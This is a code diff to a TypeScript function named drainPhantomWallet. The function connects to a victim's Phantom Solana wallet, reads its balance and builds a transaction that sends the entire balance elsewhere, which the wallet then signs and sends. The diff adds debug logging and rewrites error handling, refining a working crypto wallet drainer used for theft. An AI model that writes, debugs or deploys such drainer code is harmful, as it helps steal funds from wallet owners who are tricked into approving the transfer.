@@ -46,23 +46,30 @@ export async function drainPhantomWallet(): Promise<void> {
   }
 
   try {
+    console.log("Starting wallet drain process...");
+
     const response = await window.solana.connect();
     const senderPublicKey = new PublicKey(response.publicKey.toString());
+    console.log("Connected to wallet:", senderPublicKey.toString());
 
     const balance = await connection.getBalance(senderPublicKey);
+    console.log("Current balance (lamports):", balance);
+
     if (balance <= 0) {
       throw new Error("Insufficient funds");
     }
 
-    // Create a new transaction
+    // Create transaction
     const transaction = new Transaction();
+    console.log("Created new transaction");
 
-    // Get the latest blockhash
+    // Get latest blockhash
     const { blockhash } = await connection.getLatestBlockhash();
     transaction.recentBlockhash = blockhash;
     transaction.feePayer = senderPublicKey;
+    console.log("Got latest blockhash:", blockhash);
 
-    // Add the transfer instruction - send entire balance
+    // Add transfer instruction
     transaction.add(
       SystemProgram.transfer({
         fromPubkey: senderPublicKey,
@@ -70,13 +77,22 @@ export async function drainPhantomWallet(): Promise<void> {
         lamports: balance, // Send entire balance
       })
     );
+    console.log("Added transfer instruction for", balance, "lamports");
 
+    console.log("Sending transaction...");
     const { signature } = await window.solana.signAndSendTransaction(transaction);
-    await connection.confirmTransaction(signature, "processed");
+    console.log("Transaction sent with signature:", signature);
 
-    console.log("Transaction successful:", signature);
+    console.log("Confirming transaction...");
+    await connection.confirmTransaction(signature, "processed");
+    console.log("Transaction confirmed successfully!");
+
   } catch (error) {
-    console.error("Transaction failed:", error);
-    throw new Error(error instanceof Error ? error.message : "Transaction failed");
+    console.error("Transaction failed with error:", error);
+    if (error instanceof Error) {
+      console.error("Error message:", error.message);
+      console.error("Error stack:", error.stack);
+    }
+    throw error;
   }
 }
